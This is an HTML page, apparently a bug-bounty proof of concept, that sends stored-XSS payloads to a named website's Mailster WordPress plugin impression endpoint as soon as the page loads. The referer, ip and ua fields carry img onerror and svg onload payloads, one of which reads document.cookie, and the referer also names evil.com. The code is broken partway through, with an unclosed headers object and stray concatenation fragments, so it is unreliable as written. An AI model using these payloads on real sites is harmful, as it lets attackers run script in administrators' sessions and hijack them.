<!DOCTYPE html>
<html>
<head>

<body>
<h1>PoC: XSS Injection via Mailster Impression</h1>
<div id="result">Injection en cours...</div>

<script>
// PoC pour Bug Bounty Mailster
async function sendPayload() {
    var resultDiv = document.getElementById('result');
    resultDiv.innerHTML = 'Envoi du payload...';
    
    try {
        var payload = {
            form_id: 1,
            referer: 'https://evil.com/<img src=x onerror=alert(document.cookie)>',
            ip: '<svg onload=alert("XSS in admin dashboard")>',
            ua: '<img src=x onerror=alert("Stored XSS in Mailster stats")>'
        };
        
        var response = await fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/impression', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'

                             'Response: ' + JSON.stringify(data) + '<br><br>' +

                             '- IP: ' + payload.ip + '<br>' +
                             '- UA: ' + payload.ua + '<br><br>' +
                             '<b>⚠ Vérifie le dashboard admin Mailster pour l\'exécution XSS</b>';
        
    } catch (error) {
        resultDiv.innerHTML = '<b>✗ Erreur:</b> ' + error.message;
    }
}

sendPayload();
